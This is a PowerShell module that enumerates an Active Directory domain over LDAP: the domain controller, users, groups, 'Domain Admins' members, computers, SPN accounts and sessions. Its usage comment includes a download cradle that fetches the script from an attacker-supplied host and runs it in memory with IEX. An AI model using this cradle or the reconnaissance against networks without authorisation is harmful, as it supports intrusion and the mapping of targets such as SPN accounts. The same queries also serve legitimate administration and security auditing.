function Domain-Enum {
    param ($GetFromDomain, $GroupName, $UserName)
​
    <#
    This is an example of a single function that can be imported as a module into PowerShell
    to Perform Basic AD Enumeration.
    You can Query AD for Users, Computers, Groups, SPNs , Group Memberships, Specific User Info.
    The capabilities of employing PowerShell to call out other Objects besides what is show here is endless.
    I encourage you to do more than I did with this
    and share it.
​
    Resource for additional LDAP filters:
    https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx

    TO USE:
    You can Open PowerShell and type > Import-Module .\Domain-Enum.ps1
    Or
    Download it via a PowerShell Cradle > IEX (New-Object System.Net.Webclient).DownloadString('http://<Your-IP>:<Your-Port>/Domain-Enum.ps1')
​
    EXAMPLE COMMANDS:
    Domain-Enum -GetFromDomain dc
    Domain-Enum -GetFromDomain users
    Domain-Enum -GetFromDomain userinfo -UserName "domainuser"
    Domain-Enum -GetFromDomain groups
    Domain-Enum -GetFromDomain members -GroupName "Domain Admins"
    Domain-Enum -GetFromDomain Computers
    Domain-Enum -GetFromDomain spns
​
    #>
​
    if ($GetFromDomain -eq 'DC' )
    {
            $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $PDC = ($domainObj.PdcRoleOwner).Name
            $SearchString = "LDAP://"
            $SearchString += $PDC + "/"
            $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
            $SearchString += $DistinguishedName
            Write-Host "`n"
            Write-Host "The PRIMARY DOMAIN CONTROLLER: " -ForegroundColor green $PDC
            Test-Connection -ComputerName $PDC -Count 2 | Select-object -Property IPV4Address -Unique
​
    }
    if ($GetFromDomain -eq 'Groups' )
    {
            $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $PDC = ($domainObj.PdcRoleOwner).Name
            $SearchString = "LDAP://"
            $SearchString += $PDC + "/"
            $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
            $SearchString += $DistinguishedName
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry
            $Searcher.SearchRoot = $objDomain
            $Searcher.filter="(objectClass=Group)"
            $Result = $Searcher.FindAll()
            Write-Host "DISCOVERED GROUPS " -ForegroundColor green
            Foreach($obj in $Result)
            {
                 $obj.Properties.name
            }
            Write-Host "------------------------`n"
    }

​
    if ($GetFromDomain -eq 'Users')
    {
            $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $PDC = ($domainObj.PdcRoleOwner).Name
            $SearchString = "LDAP://"
            $SearchString += $PDC + "/"
            $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
            $SearchString += $DistinguishedName
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry
            $Searcher.SearchRoot = $objDomain
            $Searcher.filter="samAccountType=805306368"
            $Result = $Searcher.FindAll()
            Write-Host "DISCOVERED ACCOUNTS " -ForegroundColor green
            Foreach($obj in $Result)
            {
            Foreach($prop in $obj.Properties)
                {
                    Write-Host "Account Holder : " -ForegroundColor green $prop.displayname
                    Write-Host "UserName       : " $prop.samaccountname
                    Write-Host "Member Of      : " $prop.memberof
                }
                Write-Host "`n"
            }
    }
​
​
    if ($GetFromDomain -eq 'Computers')
    {
            $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $PDC = ($domainObj.PdcRoleOwner).Name
            $SearchString = "LDAP://"
            $SearchString += $PDC + "/"
            $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
            $SearchString += $DistinguishedName
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry
            $Searcher.SearchRoot = $objDomain
            $Searcher.filter="(objectClass=Computer)"
            $Result = $Searcher.FindAll()
            Write-Host "DOMAIN COMPUTERS " -ForegroundColor green
            Foreach($obj in $Result)
            {
            Foreach($prop in $obj.Properties)
                {
                    Write-Host "Computer Name :" -ForegroundColor green $prop.name
                    Write-Host "Operating System :"$prop.operatingsystem
                    Write-Host "DNS Name :"$prop.dnshostname
                    Test-Connection -ComputerName $prop.name -Count 2 | Select-object -Property IPV4Address
                }
            Write-Host "`n"
​
            }
    }
​
​
​
    if ($GetFromDomain -eq 'Members')
    {
            $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $PDC = ($domainObj.PdcRoleOwner).Name
            $SearchString = "LDAP://"
            $SearchString += $PDC + "/"
            $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
            $SearchString += $DistinguishedName
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry
            $Searcher.SearchRoot = $objDomain
            $Searcher.filter="(objectCategory=Group)"
            $Searcher.filter="(name=$GroupName)"
            $Result = $Searcher.FindAll()
            Write-Host "MEMBER(S) OF GROUP : " -ForegroundColor green $GroupName
            Foreach($obj in $Result)
            {
                $obj.Properties.member| Select-String -Pattern '(\w+ \w+)|(\w+\,)' | foreach{$_.Matches} | Format-List -Property Value | Format-List -Property *
                $obj.Properties.description
​
            }
    }
​
    if ($GetFromDomain -eq 'SPNs')
    {
            $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $PDC = ($domainObj.PdcRoleOwner).Name
            $SearchString = "LDAP://"
            $SearchString += $PDC + "/"
            $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
            $SearchString += $DistinguishedName
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry
            $Searcher.SearchRoot = $objDomain
            $Searcher.filter="serviceprincipalname=*"
            $Result = $Searcher.FindAll()
            Write-Host "DISCOVERED SPNs " -ForegroundColor green
            Foreach($obj in $Result)
            {
            Foreach($prop in $obj.Properties)
                {
                    Write-Host "Host: " -ForegroundColor green $prop.samaccountname
                    $prop.serviceprincipalname
​
                }
            Write-Host "`n"
            }
        }
​
​
    if ($GetFromDomain -eq 'UserInfo')
    {
            $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $PDC = ($domainObj.PdcRoleOwner).Name
            $SearchString = "LDAP://"
            $SearchString += $PDC + "/"
            $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
            $SearchString += $DistinguishedName
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry
            $Searcher.SearchRoot = $objDomain
            $Searcher.filter="samaccountname=$UserName"
            $Result = $Searcher.FindAll()
            Foreach($obj in $Result)
            {
            Foreach($prop in $obj.Properties)
                {
                    Write-Host "USER INFO FOR : " -ForegroundColor green $UserName
                    $prop
                }
            Write-Host "------------------------`n"
            }
    }
​
    if ($GetFromDomain -eq 'sessions')
    {
            (((quser) -replace '^>', '') -replace '\s{2,}', ',').Trim() | ForEach-Object {
            if ($_.Split(',').Count -eq 5) {
                Write-Output ($_ -replace '(^[^,]+)', '$1,')
            } else {
                        Write-Output $_
                    }
            } | ConvertFrom-Csv
    }
​
}
​